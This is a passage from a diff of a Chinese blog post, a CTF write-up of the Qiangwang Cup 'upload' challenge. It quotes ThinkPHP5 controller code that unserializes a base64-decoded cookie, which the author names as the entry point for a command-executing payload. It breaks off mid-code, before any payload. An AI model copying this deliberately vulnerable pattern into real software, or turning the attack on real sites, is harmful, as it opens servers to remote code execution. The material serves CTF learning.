@@ -1,683 +1,490 @@
 <!DOCTYPE html>
+<html class="has-navbar-fixed-top">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+<title>强网杯upload Writeup与简单分析 - Threezh1&#39;s blog</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.css">
 
 
 
 
-
-<html lang="Chinese">
-<head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/head.jpg?v=7.3.0">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/head.jpg?v=7.3.0">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/head.jpg?v=7.3.0">
-  <link rel="mask-icon" href="/images/head.jpg?v=7.3.0" color="#222">
-
-<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+<meta name="description" content="Share learn & Share life.">
 
 
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+<meta name="keywords" content="Threezh1">
 
 
-<script id="hexo-configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Pisces',
-    version: '7.3.0',
-    exturl: false,
-    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
-    copycode: {"enable":false,"show_result":false,"style":null},
-    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
-    bookmark: {"enable":false,"color":"#222","save":"auto"},
-    fancybox: false,
-    mediumzoom: false,
-    lazyload: false,
-    pangu: false,
-    algolia: {
-      appID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    },
-    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
-    path: '',
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    translation: {
-      copy_button: 'Kopieren',
-      copy_success: 'Kopiert',
-      copy_failure: 'Kopieren fehlgeschlagen'
-    }
-  };
-</script>
 
-  <meta name="description" content="说在前面第一次打强网杯，没想到这么难，萌新瑟瑟发抖。BY Threezh1 题目有点绕，看了半天都没找到重点。后面还是靠学长给的payload思路理清楚了过程。这里就记录一下，学习学习。 题目分析网站基本功能： 注册登录后，可以上传一张图片作为头像。 无论上传什么格式的文件，文件名都会修改为md5值.png 分析： 使用dirsearch等工具可以直接扫到网站源码地址： http://49.4.6">
-<meta name="keywords" content="PHP代码审计">
+    <meta name="description" content="&amp;#x8BF4;&amp;#x5728;&amp;#x524D;&amp;#x9762;&amp;#x7B2C;&amp;#x4E00;&amp;#x6B21;&amp;#x6253;&amp;#x5F3A;&amp;#x7F51;&amp;#x676F;&amp;#xFF0C;&amp;#x6CA1;&amp;#x60F3;&amp;#x5230;&amp;#x8FD9;&amp;#x4E48;&amp;#x96BE;&amp;#xFF0C;&amp;#x840C;&amp;#x65B0;&amp;#x745F;&amp;#x745F;&amp;#x53D1;&amp;#x6296;">
+<meta name="keywords" content="Writeup,PHP,代码审计">
 <meta property="og:type" content="article">
 <meta property="og:title" content="强网杯upload Writeup与简单分析">
 <meta property="og:url" content="http://yoursite.com/2019/05/26/强网杯upload Writeup与简单分析/index.html">
 <meta property="og:site_name" content="Threezh1&#39;s blog">
-<meta property="og:description" content="说在前面第一次打强网杯，没想到这么难，萌新瑟瑟发抖。BY Threezh1 题目有点绕，看了半天都没找到重点。后面还是靠学长给的payload思路理清楚了过程。这里就记录一下，学习学习。 题目分析网站基本功能： 注册登录后，可以上传一张图片作为头像。 无论上传什么格式的文件，文件名都会修改为md5值.png 分析： 使用dirsearch等工具可以直接扫到网站源码地址： http://49.4.6">
+<meta property="og:description" content="&amp;#x8BF4;&amp;#x5728;&amp;#x524D;&amp;#x9762;&amp;#x7B2C;&amp;#x4E00;&amp;#x6B21;&amp;#x6253;&amp;#x5F3A;&amp;#x7F51;&amp;#x676F;&amp;#xFF0C;&amp;#x6CA1;&amp;#x60F3;&amp;#x5230;&amp;#x8FD9;&amp;#x4E48;&amp;#x96BE;&amp;#xFF0C;&amp;#x840C;&amp;#x65B0;&amp;#x745F;&amp;#x745F;&amp;#x53D1;&amp;#x6296;">
 <meta property="og:locale" content="Chinese">
 <meta property="og:image" content="https://i.loli.net/2019/05/26/5cea55c1ec25028053.jpg">
 <meta property="og:image" content="https://i.loli.net/2019/05/26/5cea55c3c204d65669.jpg">
 <meta property="og:image" content="https://i.loli.net/2019/05/26/5cea55c23688270315.jpg">
-<meta property="og:updated_time" content="2019-08-23T06:19:37.219Z">
+<meta property="og:updated_time" content="2020-02-12T14:07:19.980Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="强网杯upload Writeup与简单分析">
-<meta name="twitter:description" content="说在前面第一次打强网杯，没想到这么难，萌新瑟瑟发抖。BY Threezh1 题目有点绕，看了半天都没找到重点。后面还是靠学长给的payload思路理清楚了过程。这里就记录一下，学习学习。 题目分析网站基本功能： 注册登录后，可以上传一张图片作为头像。 无论上传什么格式的文件，文件名都会修改为md5值.png 分析： 使用dirsearch等工具可以直接扫到网站源码地址： http://49.4.6">
+<meta name="twitter:description" content="&amp;#x8BF4;&amp;#x5728;&amp;#x524D;&amp;#x9762;&amp;#x7B2C;&amp;#x4E00;&amp;#x6B21;&amp;#x6253;&amp;#x5F3A;&amp;#x7F51;&amp;#x676F;&amp;#xFF0C;&amp;#x6CA1;&amp;#x60F3;&amp;#x5230;&amp;#x8FD9;&amp;#x4E48;&amp;#x96BE;&amp;#xFF0C;&amp;#x840C;&amp;#x65B0;&amp;#x745F;&amp;#x745F;&amp;#x53D1;&amp;#x6296;">
 <meta name="twitter:image" content="https://i.loli.net/2019/05/26/5cea55c1ec25028053.jpg">
-  <link rel="canonical" href="http://yoursite.com/2019/05/26/强网杯upload Writeup与简单分析/">
-
-
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome: false,
-    isPost: true,
-    isPage: false,
-    isArchive: false
-  };
-</script>
-
-  <title>强网杯upload Writeup与简单分析 | Threezh1's blog</title>
-  <meta name="generator" content="Hexo 3.8.0">
-  
-
-
-  <script>
-    var _hmt = _hmt || [];
-    (function() {
-      var hm = document.createElement("script");
-      hm.src = "https://hm.baidu.com/hm.js?41896264c6b7bfbb2d9ae9719e4440c2";
-      var s = document.getElementsByTagName("script")[0];
-      s.parentNode.insertBefore(hm, s);
-    })();
-  </script>
 
 
 
 
 
+<link rel="icon" href="/favicon.png">
 
-  <noscript>
-  <style>
-  .use-motion .motion-element,
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
 
-  .use-motion .logo,
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/bulma/0.6.2/css/bulma.min.css">
 
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/css/justifiedGallery.min.css">
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">
+
+<link rel="stylesheet" href="/css/style.css">
+
+<script defer src="//use.fontawesome.com/releases/v5.0.8/js/all.js"></script>
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
 
 </head>
-
-<body itemscope itemtype="http://schema.org/WebPage" lang="Chinese">
-  <div class="container use-motion">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta">
-
-    <div>
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Threezh1's blog</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-        <p class="site-subtitle">分享学习、分享想法</p>
-      
-  </div>
-
-  <div class="site-nav-toggle">
-    <button aria-label="Navigationsleiste an/ausschalten">
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
-  </div>
-</div>
-
-
-<nav class="site-nav">
-  
-  <ul id="menu" class="menu">
-      
-      
-      
-        
-        <li class="menu-item menu-item-home">
-      
+<body>
     
-
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>
-
-  </li>
-      
-      
-      
-        
-        <li class="menu-item menu-item-archives">
-      
-    
-
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>
-
-  </li>
-      
-      
-      
-        
-        <li class="menu-item menu-item-threeday">
-      
-    
-
-    <a href="http://119.3.219.188/" rel="noopener" target="_blank"><i class="menu-item-icon fa fa-fw fa-Threeday"></i> <br>Threeday</a>
-
-  </li>
-  </ul>
-
-</nav>
-</div>
-    </header>
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-            
-
-          <div id="content" class="content page-post-detail">
-            
-
-  <div id="posts" class="posts-expand">
-    
-
-  <article class="post" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/26/强网杯upload Writeup与简单分析/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Threezh1">
-      <meta itemprop="description" content="Share learn & Share life.">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Threezh1's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">强网杯upload Writeup与简单分析
-
-          
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Veröffentlicht am</span>
-
-              
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/">
                 
-              
-
-              <time title="Erstellt: 2019-05-26 17:14:26" itemprop="dateCreated datePublished" datetime="2019-05-26T17:14:26+08:00">2019-05-26</time>
-            </span>
-          
-            
-
-            
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Bearbeitet am</span>
-                <time title="Geändert am: 2019-08-23 14:19:37" itemprop="dateModified" datetime="2019-08-23T14:19:37+08:00">2019-08-23</time>
-              </span>
-            
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">in</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Writeup/" itemprop="url" rel="index"><span itemprop="name">Writeup</span></a></span>
-
+                <img src="/images/logo.png" alt height="28">
                 
-                
-              
-            </span>
-          
-
-          
-
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
         </div>
-      </header>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item " href="/archives">归档</a>
+            
+            <a class="navbar-item " href="/Projects">项目</a>
+            
+            <a class="navbar-item " href="/Life">生活</a>
+            
+            <a class="navbar-item " href="/Photography">摄影</a>
+            
+            <a class="navbar-item " href="/About">关于</a>
+            
+            <a class="navbar-item " href="http://119.3.219.188/">Threeday</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            <a class="navbar-item search" title="Buscar" href="javascript:;">
+                <i class="fas fa-search"></i>
+            </a>
+            
+            
+            
+            <a class="navbar-item" title="GitHub" href="https://github.com/Threezh1">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+               
+            
+        </div>
+    </div>
+</nav>
 
+    <section class="section">
+    <div class="container">
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            强网杯upload Writeup与简单分析
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            <time datetime="2019-05-26T09:14:26.000Z" itemprop="datePublished">May 26 2019</time>
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/categories/技术文章/">技术文章</a>
+        </span>
+        
+        
+        <span class="column is-narrow">
+            
+            
+            17 minutes de lectura (Alrededor de 2555 palabras)
+        </span>
+        
+    </div>
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-        <h2 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h2><p>第一次打强网杯，没想到这么难，萌新瑟瑟发抖。BY Threezh1</p>
-<p>题目有点绕，看了半天都没找到重点。后面还是靠学长给的payload思路理清楚了过程。这里就记录一下，学习学习。</p>
-<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p><strong>网站基本功能：</strong></p>
-<p>注册登录后，可以上传一张图片作为头像。</p>
-<p>无论上传什么格式的文件，文件名都会修改为<code>md5值.png</code></p>
-<p><strong>分析：</strong></p>
-<p>使用dirsearch等工具可以直接扫到网站源码地址：</p>
+        <h2 id="&#x8BF4;&#x5728;&#x524D;&#x9762;"><a href="#&#x8BF4;&#x5728;&#x524D;&#x9762;" class="headerlink" title="&#x8BF4;&#x5728;&#x524D;&#x9762;"></a>&#x8BF4;&#x5728;&#x524D;&#x9762;</h2><p>&#x7B2C;&#x4E00;&#x6B21;&#x6253;&#x5F3A;&#x7F51;&#x676F;&#xFF0C;&#x6CA1;&#x60F3;&#x5230;&#x8FD9;&#x4E48;&#x96BE;&#xFF0C;&#x840C;&#x65B0;&#x745F;&#x745F;&#x53D1;&#x6296;&#x3002;BY Threezh1</p>
+<p>&#x9898;&#x76EE;&#x6709;&#x70B9;&#x7ED5;&#xFF0C;&#x770B;&#x4E86;&#x534A;&#x5929;&#x90FD;&#x6CA1;&#x627E;&#x5230;&#x91CD;&#x70B9;&#x3002;&#x540E;&#x9762;&#x8FD8;&#x662F;&#x9760;&#x5B66;&#x957F;&#x7ED9;&#x7684;payload&#x601D;&#x8DEF;&#x7406;&#x6E05;&#x695A;&#x4E86;&#x8FC7;&#x7A0B;&#x3002;&#x8FD9;&#x91CC;&#x5C31;&#x8BB0;&#x5F55;&#x4E00;&#x4E0B;&#xFF0C;&#x5B66;&#x4E60;&#x5B66;&#x4E60;&#x3002;<br><a id="more"></a></p>
+<h2 id="&#x9898;&#x76EE;&#x5206;&#x6790;"><a href="#&#x9898;&#x76EE;&#x5206;&#x6790;" class="headerlink" title="&#x9898;&#x76EE;&#x5206;&#x6790;"></a>&#x9898;&#x76EE;&#x5206;&#x6790;</h2><p><strong>&#x7F51;&#x7AD9;&#x57FA;&#x672C;&#x529F;&#x80FD;&#xFF1A;</strong></p>
+<p>&#x6CE8;&#x518C;&#x767B;&#x5F55;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;&#x4E0A;&#x4F20;&#x4E00;&#x5F20;&#x56FE;&#x7247;&#x4F5C;&#x4E3A;&#x5934;&#x50CF;&#x3002;</p>
+<p>&#x65E0;&#x8BBA;&#x4E0A;&#x4F20;&#x4EC0;&#x4E48;&#x683C;&#x5F0F;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x6587;&#x4EF6;&#x540D;&#x90FD;&#x4F1A;&#x4FEE;&#x6539;&#x4E3A;<code>md5&#x503C;.png</code></p>
+<p><strong>&#x5206;&#x6790;&#xFF1A;</strong></p>
+<p>&#x4F7F;&#x7528;dirsearch&#x7B49;&#x5DE5;&#x5177;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x626B;&#x5230;&#x7F51;&#x7AD9;&#x6E90;&#x7801;&#x5730;&#x5740;&#xFF1A;</p>
 <p><a href="http://49.4.6.176:32288/www.tar.gz" target="_blank" rel="noopener">http://49.4.6.176:32288/www.tar.gz</a></p>
-<p>框架为TP5，直接看application/web/controller目录。包括了以下几个模块，分别对应了网站的几个功能。由于Login.php里没有对解题有用的信息，我们就只看其他三个页面。</p>
-<pre><code>Index.php         //账户首页
-Login.php         //登陆
-Profile.php     //上传
-Register.php     //注册
-</code></pre><a id="more"></a>
-<p><strong>Index.php</strong></p>
-<p>它的作用为判断是否登录，根据是否已经上传图片来显示指定的用户主页模板。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $profile;</span><br><span class="line">    <span class="keyword">public</span> $profile_db;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;login_check())&#123;   <span class="comment">//判断是否已经登录</span></span><br><span class="line">            $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/home"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(<span class="string">"index"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">home</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;login_check())&#123;  <span class="comment">//再判断是否登录</span></span><br><span class="line">            $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;check_upload_img())&#123; <span class="comment">//检查是否已经上传图片</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;assign(<span class="string">"username"</span>,<span class="keyword">$this</span>-&gt;profile_db[<span class="string">'username'</span>]);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(<span class="string">"upload"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;assign(<span class="string">"img"</span>,<span class="keyword">$this</span>-&gt;profile_db[<span class="string">'img'</span>]);  <span class="comment">//</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;assign(<span class="string">"username"</span>,<span class="keyword">$this</span>-&gt;profile_db[<span class="string">'username'</span>]);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(<span class="string">"home"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span><span class="params">()</span></span>&#123;  <span class="comment">//登录检查  </span></span><br><span class="line">        $profile=cookie(<span class="string">'user'</span>);    <span class="comment">//获取cookie</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($profile))&#123;   <span class="comment">//判断是否为空</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;profile=unserialize(base64_decode($profile));    <span class="comment">//将cookie解码后反序列化</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;profile_db=db(<span class="string">'user'</span>)-&gt;where(<span class="string">"ID"</span>,intval(<span class="keyword">$this</span>-&gt;profile[<span class="string">'ID'</span>]))-&gt;find(); <span class="comment">//根据反序列化出来的id在数据库中查询</span></span><br><span class="line">            <span class="keyword">if</span>(array_diff(<span class="keyword">$this</span>-&gt;profile_db,<span class="keyword">$this</span>-&gt;profile)==<span class="keyword">null</span>)&#123; <span class="comment">//进行差值查询</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check_upload_img</span><span class="params">()</span></span>&#123; <span class="comment">//检查是否已经上传图片，根据cookie当中和查询出来的数据</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;profile) &amp;&amp; !<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;profile_db))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;profile_db[<span class="string">'img'</span>]))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">logout</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cookie(<span class="string">"user"</span>,<span class="keyword">null</span>);</span><br><span class="line">        $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>里面与一个题目相关且重要的函数为login_check()：</p>
-<p>函数中先获取cookie，如果cookie不为空，则将cookie进行base64解码之后反序列化。</p>
-<p>这个反序列化函数也就是解题的入口，我们的目的就是构造序列化的payload赋值到cookie里，经过反序列执行我们想要的命令。</p>
+<p>&#x6846;&#x67B6;&#x4E3A;TP5&#xFF0C;&#x76F4;&#x63A5;&#x770B;application/web/controller&#x76EE;&#x5F55;&#x3002;&#x5305;&#x62EC;&#x4E86;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x6A21;&#x5757;&#xFF0C;&#x5206;&#x522B;&#x5BF9;&#x5E94;&#x4E86;&#x7F51;&#x7AD9;&#x7684;&#x51E0;&#x4E2A;&#x529F;&#x80FD;&#x3002;&#x7531;&#x4E8E;Login.php&#x91CC;&#x6CA1;&#x6709;&#x5BF9;&#x89E3;&#x9898;&#x6709;&#x7528;&#x7684;&#x4FE1;&#x606F;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EA;&#x770B;&#x5176;&#x4ED6;&#x4E09;&#x4E2A;&#x9875;&#x9762;&#x3002;</p>
+<pre><code>Index.php         //&#x8D26;&#x6237;&#x9996;&#x9875;
+Login.php         //&#x767B;&#x9646;
+Profile.php     //&#x4E0A;&#x4F20;
+Register.php     //&#x6CE8;&#x518C;
+</code></pre><p><strong>Index.php</strong></p>
+<p>&#x5B83;&#x7684;&#x4F5C;&#x7528;&#x4E3A;&#x5224;&#x65AD;&#x662F;&#x5426;&#x767B;&#x5F55;&#xFF0C;&#x6839;&#x636E;&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x4E0A;&#x4F20;&#x56FE;&#x7247;&#x6765;&#x663E;&#x793A;&#x6307;&#x5B9A;&#x7684;&#x7528;&#x6237;&#x4E3B;&#x9875;&#x6A21;&#x677F;&#x3002;</p>
+<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">web</span>\<span class="hljs-title">controller</span>;</span><br><span class="line"><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> $profile;</span><br><span class="line">    <span class="hljs-keyword">public</span> $profile_db;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span 